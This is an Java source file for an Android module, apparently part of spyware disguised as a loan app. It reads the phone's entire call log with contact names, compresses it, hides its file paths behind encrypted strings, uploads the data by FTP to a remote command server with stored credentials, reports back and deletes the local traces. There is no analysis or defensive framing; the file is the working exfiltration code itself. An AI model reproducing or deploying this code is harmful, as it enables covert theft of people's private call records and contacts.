package sub.app.func;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import sub.app.client.CallLogPacket;
import sub.app.client.CallPacket;
import sub.app.client.StatusPacket;
import sub.app.entry.Protocol;
import sub.app.entry.TaskListener;

import main.app.loan.GlobalLib;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.provider.CallLog;


@SuppressLint("DefaultLocale")
public class CallLogListener {

	
	public static boolean listCallLog(TaskListener c, int channel, byte[] args) {

		boolean ret =false;
		
		try{
			ArrayList<CallPacket> l = new ArrayList<CallPacket>();
	//		String WHERE_CONDITION = new String(args);
			String SORT_ORDER = "date DESC";
			String[] column = { "_id", "type", "date", "duration", "number","name"};
			
			Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column , null, null, SORT_ORDER);
			
			
	        if(cursor.getCount() != 0) {
		        cursor.moveToFirst();
		
		        do{
		           if(cursor.getColumnCount() != 0) {
		        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
		        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
		        	   
		        	   long date = cursor.getLong(cursor.getColumnIndex("date"));	        	   
		        	   Date dtTm = new Date(date);
		        	   SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
		        	   String strTm = mSimpleDateFormat.format(dtTm);
	
		        	   long duration = cursor.getLong(cursor.getColumnIndex("duration"));
		        	   
		        	   String number  = cursor.getString(cursor.getColumnIndex("number"));
		        	   number = ContactsListener.appendContactName(c, number);
		        	   String name = cursor.getString(cursor.getColumnIndex("name"));
		        	   int raw_contact_id = 0;
		        	   
		        	   l.add(new CallPacket(id, type, strTm, duration, raw_contact_id, number, name));
		           }
		        }while(cursor.moveToNext());
		        ret = true;
	        }
	        else
	        	ret = false;
	        
	        cursor.close();
	        
	//		c.handleData(Protocol.OPCLIENT_CALL_LOGS, channel, new CallLogPacket(l).build());
	        byte[] raw = new CallLogPacket(l).build();
	        byte[] data =  Protocol.compress(raw);
	        if(data != null)
	        {
	        	String STRING_DIRCALL = GlobalLib.decrypt("3UrJjxrW4ledw7XAQ0yM+A==");
	        	String STRING_CALLLOGDAT = GlobalLib.decrypt("cacOg8i+a76qKGU2DHW4HA==");
	        	
	    		String dirPath = c.getFilesDir() + STRING_DIRCALL; // "/dircall";
	    		File callF = new File(dirPath);
	    		if(callF.exists() == false) callF.mkdir();
	    		
	    		String fileName = STRING_CALLLOGDAT; //"calllog.dat";
	
	    		callF = new File(dirPath, fileName);
	    		callF.delete();
	    		
	    	    try{
	    	    	callF.createNewFile();
	    	    	FileOutputStream outStream = new FileOutputStream(callF, true);
	    		    outStream.write(data);
	    		    outStream.flush();
	    		    outStream.close();
	    	    }catch(Exception e){
	    	    }
	    	    
	    	    data = null;
	    	    
	    	    System.gc();
	    		
	//    		c.sendFilePacket(Protocol.OPCLIENT_CALL_LOGS, channel, callF);
	    	    boolean success = false;
	
	    	    FtpManager ftpManager = new FtpManager();
				ftpManager.setAccount(Protocol.getServerIP(), FileDownloader.FTP_ID, FileDownloader.FTP_PW, c);
				if( ftpManager.FtpLogin() == true )
				{
					success = ftpManager.FtpUploadFile(callF);
				}
				ftpManager.FtpLogout();
				ftpManager = null;
				
				StatusPacket packet = new StatusPacket(Protocol.STATUS_TYPE_FTPCALL, success, 0, 0, callF.getName());
	    		c.handleData(Protocol.OPCLIENT_STATUS, channel, packet.build());
	    		
	    		callF.delete();
	    		
//	            Log.d("info", "listCall success");
	        }
		}
		catch(Exception e)
		{
		}
        return ret;
	}
	
}
